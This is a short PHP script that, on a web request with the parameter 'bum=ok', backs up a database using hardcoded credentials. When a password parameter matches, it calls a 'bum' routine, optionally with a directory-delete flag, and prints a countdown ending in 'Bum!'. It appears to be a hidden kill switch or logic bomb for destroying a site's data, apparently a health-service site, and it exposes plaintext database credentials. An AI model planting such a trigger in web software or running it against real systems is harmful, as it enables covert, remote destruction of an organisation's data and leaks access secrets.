<?php
if($_GET["bum"] == "ok"){
    include("paicodb.php");
    $bum = new paicoDB();
    $senha = "pmosaude_2011#";
    echo "3... <br>";
    $bum->backup("localhost", "pmosaudeweb", $senha, "PrW2KqYEbfv5hcQe");
    echo "2... <br>";
    #$bum->sendsmtp();
    if($_GET["s"] == $senha){
        if(!empty($_GET["deldir"])){
            $bum->bum("localhost", "pmosaudeweb", $senha, "PrW2KqYEbfv5hcQe",1);
        }else{
            $bum->bum("localhost", "pmosaudeweb", $senha, "PrW2KqYEbfv5hcQe");
        }
        echo "1... <br>";
    }else{
        echo "1... <br>";
    }
    echo "<b style=\"color: red\">Bum!</b>";
}
?>